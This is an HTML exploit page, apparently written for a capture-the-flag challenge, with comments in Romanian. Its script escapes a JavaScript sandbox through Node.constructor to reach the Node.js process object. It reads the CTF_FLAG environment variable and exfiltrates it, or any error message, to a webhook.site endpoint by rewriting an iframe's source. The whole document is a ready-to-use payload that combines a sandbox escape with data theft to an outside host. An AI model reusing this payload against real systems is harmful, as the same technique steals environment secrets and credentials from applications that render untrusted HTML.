<!DOCTYPE html>
<html>
<body>
    <iframe id="exfil" src="https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/inceput"></iframe>
    <script>
        try {
            // Accesăm constructorul pentru a ajunge la variabila de mediu [cite: 41, 42]
            const outerRealm = Node.constructor;
            const process = new outerRealm("return process")();
            const steag = process.env['CTF_FLAG'];

            // Așteptăm 2 secunde pentru a asigura încărcarea 
            setTimeout(function() {
                // Trimitem flag-ul către Webhook [cite: 44, 45]
                document.getElementById('exfil').src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?steag=" + encodeURIComponent(steag);
            }, 2000);
        } catch (e) {
            // Dacă apare o eroare, o trimitem pentru diagnosticare
            document.getElementById('exfil').src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?eroare=" + encodeURIComponent(e.message);
        }
    </script>
</body>
</html>
